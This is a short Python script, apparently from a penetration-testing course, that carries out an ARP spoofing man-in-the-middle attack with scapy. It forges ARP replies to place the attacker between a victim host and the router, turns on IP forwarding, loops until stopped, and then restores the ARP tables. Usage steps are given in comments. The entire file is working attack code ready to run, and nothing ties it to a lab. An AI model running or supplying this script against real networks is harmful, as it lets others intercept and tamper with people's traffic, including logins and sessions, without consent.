#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import subprocess


# 1. Update victim and gateway IPs
# 2. Run program with: python arp_spoof.py
# 3. Client terminal: use "arp -a" to check arp table
# 4. "CTRL + C" to end spoof and restore defaults


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


victim_ip = "10.0.2.15"  # Update with victim ip address
gateway_ip = "10.0.2.1"  # Update with router ip address
try:
    sent_packets_count = 0
    while True:
        subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)  # Allows port forwarding
        spoof(victim_ip, gateway_ip)  # tells victim that we are the router
        spoof(gateway_ip, victim_ip)  # tells router that we are the victim

        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),  # for python3: print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Resetting ARP tables .....")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
